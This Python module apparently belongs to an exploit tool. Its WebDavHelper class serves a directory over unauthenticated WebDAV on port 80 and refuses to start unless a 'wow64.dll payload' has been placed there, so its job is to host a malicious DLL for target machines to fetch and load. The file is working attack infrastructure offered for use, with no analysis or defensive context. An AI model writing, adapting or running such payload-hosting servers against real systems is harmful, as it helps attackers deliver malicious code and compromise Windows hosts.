from pywebdav.server.server import runserver, setupDummyConfig
from pywebdav.server.fileauth import DAVAuthHandler
import threading
import os

# Constants.
WEBDAV_DIRECTORY = "webdav_dir/"
WOW64_DLL_NAME = "wow64.dll"


class WebDavHelper:
    def __init__(self) -> None:
        self.host = "0.0.0.0"
        self.port = 80
        if not os.path.exists(os.path.join(WEBDAV_DIRECTORY, WOW64_DLL_NAME)):
            raise Exception(f"You need to place a wow64.dll payload in the {WEBDAV_DIRECTORY}!")
    
    def run_server_wrapper(self):
        # Create handler with custom config.
        handler = DAVAuthHandler
        conf = {
            "lockemulation": False,
            "mimecheck": True,
            "baseurl": None
        }
        handler._config = setupDummyConfig(**conf)
        
        # Just run the server with the pywebdav package.
        runserver(port=self.port,
                  host=self.host,
                  directory=WEBDAV_DIRECTORY,
                  verbose=False,
                  noauth=True)

    def start_server(self):
        # Start the server in a new daemon thread.
        # Daemon means it will be killed when main exits.
        thread = threading.Thread(target=self.run_server_wrapper)
        thread.daemon = True
        thread.start()
